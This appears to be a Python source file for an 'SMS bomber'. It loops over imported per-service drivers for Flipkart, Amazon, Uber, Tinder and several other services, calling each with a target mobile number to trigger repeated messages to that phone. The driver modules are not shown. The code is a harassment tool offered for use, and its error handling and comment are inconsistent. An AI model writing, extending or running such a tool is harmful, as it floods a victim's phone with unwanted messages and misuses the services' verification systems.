import time
from drivers import flipkart,netmeds,abhibus,amazon,oyorooms,uber,wynk,tinder,lenskart,goibibo,snapdeal

# set the frequency of sms which is approx maximum to 10 per 24 days

def bomber(mob,frequency,n = 5):
    act=0
    while act<frequency:
        try:
            flipkart(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            netmeds(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            abhibus(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            amazon(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            oyorooms(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            uber(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            wynk(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            tinder(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            lenskart(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            goibibo(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        try:
            snapdeal(mob)
            act+=1
            time.sleep(n)
        except Exception:
            continue
        
    return 0